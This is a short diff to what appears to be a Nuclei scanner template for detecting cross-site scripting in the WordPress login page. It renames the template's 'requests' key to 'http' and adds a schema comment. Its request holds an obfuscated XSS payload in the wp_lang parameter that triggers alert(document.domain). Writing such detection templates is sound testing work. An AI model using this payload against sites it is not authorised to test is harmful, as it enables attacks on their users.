@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: Wordpress-login-XSS
 
 info:
@@ -7,7 +8,7 @@ info:
   description: XSS in Wordpress login
   tags: xss
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc%3C!%3Eusin+alert(document.domain)%0c"
